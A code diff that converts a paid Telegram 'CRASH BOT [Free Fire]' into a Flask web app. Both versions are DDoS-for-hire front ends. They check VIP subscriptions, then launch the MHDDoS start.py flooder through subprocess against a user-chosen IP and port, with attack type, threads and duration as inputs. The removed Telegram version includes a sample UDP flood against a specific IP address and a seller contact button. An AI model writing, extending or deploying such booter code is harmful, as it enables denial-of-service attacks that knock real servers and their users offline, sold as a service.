@@ -1,216 +1,117 @@
-import telebot
-import subprocess
+from flask import Flask, render_template, request, jsonify
 import sqlite3
 from datetime import datetime, timedelta
-from threading import Lock
+import subprocess
 import time
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "TOKEN AQUI"
-ADMIN_ID = 7178876305
-START_PY_PATH = "/workspaces/MHDDoS/start.py"
+app = Flask(__name__)
 
-bot = telebot.TeleBot(BOT_TOKEN)
-db_lock = Lock()
+# ตั้งค่าฐข้อมูล
+ADMIN_ID = 999
+START_PY_PATH = "start.py"
 cooldowns = {}
 active_attacks = {}
 
-conn = sqlite3.connect("users.db", check_same_thread=False)
-cursor = conn.cursor()
-cursor.execute(
-    """
-    CREATE TABLE IF NOT EXISTS vip_users (
-        id INTEGER PRIMARY KEY,
-        telegram_id INTEGER UNIQUE,
-        expiration_date TEXT
-    )
-    """
-)
-conn.commit()
+# เชื่อมต่อฐานข้อมูล SQLite
+def get_db_connection():
+    conn = sqlite3.connect("users.db", check_same_thread=False)
+    conn.row_factory = sqlite3.Row
+    return conn
 
-
-@bot.message_handler(commands=["start"])
-def handle_start(message):
-    telegram_id = message.from_user.id
-
-    with db_lock:
-        cursor.execute(
-            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
-            (telegram_id,),
+# สร้างตาราง VIP Users ถ้ายังไม่มี
+def init_db():
+    conn = get_db_connection()
+    conn.execute(
+        """
+        CREATE TABLE IF NOT EXISTS vip_users (
+            id INTEGER PRIMARY KEY,
+            telegram_id INTEGER UNIQUE,
+            expiration_date TEXT
         )
-        result = cursor.fetchone()
+        """
+    )
+    conn.commit()
+    conn.close()
 
+init_db()
+
+# หน้าแรก
+@app.route("/")
+def index():
+    return render_template("index.html")
+
+# ตรวจสอบสถานะ VIP
+@app.route("/check_vip", methods=["POST"])
+def check_vip():
+    user_id = int(request.form["user_id"])
+    conn = get_db_connection()
+    result = conn.execute(
+        "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
+        (user_id,),
+    ).fetchone()
+    conn.close()
 
     if result:
-        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
+        expiration_date = datetime.strptime(result["expiration_date"], "%Y-%m-%d %H:%M:%S")
         if datetime.now() > expiration_date:
-            vip_status = "❌ *Seu plano VIP expirou.*"
+            return jsonify({"status": "expired", "message": "VIP ของคุณหมดอายุแล้ว!"})
         else:
-            dias_restantes = (expiration_date - datetime.now()).days
-            vip_status = (
-                f"✅ CLIENTE VIP!\n"
-                f"⏳ Dias restantes: {dias_restantes} dia(s)\n"
-                f"📅 Expira en: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
+            days_remaining = (expiration_date - datetime.now()).days
+            return jsonify(
+                {
+                    "status": "active",
+                    "message": f"VIP ของคุณเหลือ {days_remaining} วัน",
+                }
             )
     else:
-        vip_status = "❌ *No tienes un plan vip activo.*"
-    markup = InlineKeyboardMarkup()
-    button = InlineKeyboardButton(
-        text="💻 VENDEDOR - OFICIAL 💻",
-        url=f"tg://user?id={ADMIN_ID}"
+        return jsonify({"status": "inactive", "message": "คุณไม่มีสิทธิ์ VIP!"})
 
-    )
-    markup.add(button)
-    
-    bot.reply_to(
-        message,
-        (
-            "🤖 *BIENVENIDO AL CRASH BOT [Free Fire]!*"
-            
+# เริ่มการโจมตี
+@app.route("/start_attack", methods=["POST"])
+def start_attack():
+    user_id = int(request.form["user_id"])
+    attack_type = request.form["type"]
+    ip_port = request.form["ip_port"]
+    threads = request.form["threads"]
+    duration = request.form["duration"]
 
-            f"""
-```
-{vip_status}```\n"""
-            "📌 *Como usar:*"
-            """
-```
-/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
-            "💡 *Ejemplo:*"
-            """
-```
-/crash UDP 143.92.125.230:10013 10 900```\n"""
-            "💠 KrizzZModz 🇵🇪 USERS VIP 💠"
-        ),
-        reply_markup=markup,
-        parse_mode="Markdown",
-    )
-
-
-@bot.message_handler(commands=["vip"])
-def handle_addvip(message):
-    if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ No eres un vendededor autorizado.")
-        return
-
-    args = message.text.split()
-    if len(args) != 3:
-        bot.reply_to(
-            message,
-            "❌ Formato inválido. Use: `/vip <ID> <QUANTOS DIAS>`",
-            parse_mode="Markdown",
-        )
-        return
-
-    telegram_id = args[1]
-    days = int(args[2])
-    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
-
-    with db_lock:
-        cursor.execute(
-            """
-            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
-            VALUES (?, ?)
-            """,
-            (telegram_id, expiration_date),
-        )
-        conn.commit()
-
-    bot.reply_to(message, f"✅ Usuário {telegram_id} agregado como VIP por {days} dias.")
-
-
-@bot.message_handler(commands=["crash"])
-def handle_ping(message):
-    telegram_id = message.from_user.id
-
-    with db_lock:
-        cursor.execute(
-            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
-            (telegram_id,),
-        )
-        result = cursor.fetchone()
+    # ตรวจสอบสิทธิ์ VIP
+    conn = get_db_connection()
+    result = conn.execute(
+        "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
+        (user_id,),
+    ).fetchone()
+    conn.close()
 
     if not result:
-        bot.reply_to(message, "❌ No tienes permiso para usar este comando.")
-        return
+        return jsonify({"status": "error", "message": "คุณไม่มีสิทธิ์ใช้คำสั่งนี้!"})
 
-    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
+    expiration_date = datetime.strptime(result["expiration_date"], "%Y-%m-%d %H:%M:%S")
     if datetime.now() > expiration_date:
-        bot.reply_to(message, "❌ Su acceso vip Expiró")
-        return
+        return jsonify({"status": "error", "message": "VIP ของคุณหมดอายุแล้ว!"})
 
-    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
-        bot.reply_to(message, "❌ Espera 10 segundos antes de iniciar otro ataque y recuerda parar el anterior.")
-        return
+    if user_id in cooldowns and time.time() - cooldowns[user_id] < 10:
+        return jsonify({"status": "error", "message": "โปรดรอ 10 วินาทีก่อนเริ่มการโจมตีใหม่!"})
 
-    args = message.text.split()
-    if len(args) != 5 or ":" not in args[2]:
-        bot.reply_to(
-            message,
-            (
-                "❌ *Formato inválido!*\n\n"
-                "📌 *Uso correto:*\n"
-                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
-                "💡 *Ejemplo:*\n"
-                "`/crash UDP 143.92.125.230:10013 10 900`"
-            ),
-            parse_mode="Markdown",
-        )
-        return
-
-    attack_type = args[1]
-    ip_port = args[2]
-    threads = args[3]
-    duration = args[4]
+    # เริ่มการโจมตี
     command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]
-
     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    active_attacks[telegram_id] = process
-    cooldowns[telegram_id] = time.time()
+    active_attacks[user_id] = process
+    cooldowns[user_id] = time.time()
 
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))
+    return jsonify({"status": "success", "message": "การโจมตีเริ่มต้นแล้ว!"})
 
-    bot.reply_to(
-        message,
-        (
-            "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
-            f"🌐 *Puerto:* {ip_port}\n"
-            f"⚙️ *Tipo:* {attack_type}\n"
-            f"🧟‍♀️ *Threads:* {threads}\n"
-            f"⏳ *Tiempo (ms):* {duration}\n\n"
-            f"💠 KrizzZModz 🇵🇪 USERS VIP 💠"
-        ),
-        reply_markup=markup,
-        parse_mode="Markdown",
-    )
-
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
-def handle_stop_attack(call):
-    telegram_id = int(call.data.split("_")[1])
-
-    if call.from_user.id != telegram_id:
-        bot.answer_callback_query(
-            call.id, "❌ Solo el usuario que inicio el ataque puede pararlo"
-        )
-        return
-
-    if telegram_id in active_attacks:
-        process = active_attacks[telegram_id]
+# หยุดการโจมตี
+@app.route("/stop_attack", methods=["POST"])
+def stop_attack():
+    user_id = int(request.form["user_id"])
+    if user_id in active_attacks:
+        process = active_attacks[user_id]
         process.terminate()
-        del active_attacks[telegram_id]
-
-        bot.answer_callback_query(call.id, "✅ Ataque parado con éxito.")
-        bot.edit_message_text(
-            "*[⛔] ATAQUE FINALIZADO[⛔]*",
-            chat_id=call.message.chat.id,
-            message_id=call.message.id,
-            parse_mode="Markdown",
-        )
-        time.sleep(3)
-        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
+        del active_attacks[user_id]
+        return jsonify({"status": "success", "message": "หยุดการโจมตีเรียบร้อยแล้ว!"})
     else:
-        bot.answer_callback_query(call.id, "❌ No se encontro ningun ataque, siga con su acción.")
+        return jsonify({"status": "error", "message": "ไม่พบการโจมตีที่กำลังทำงานอยู่!"})
 
 if __name__ == "__main__":
-    bot.infinity_polling()
+    app.run(debug=True)
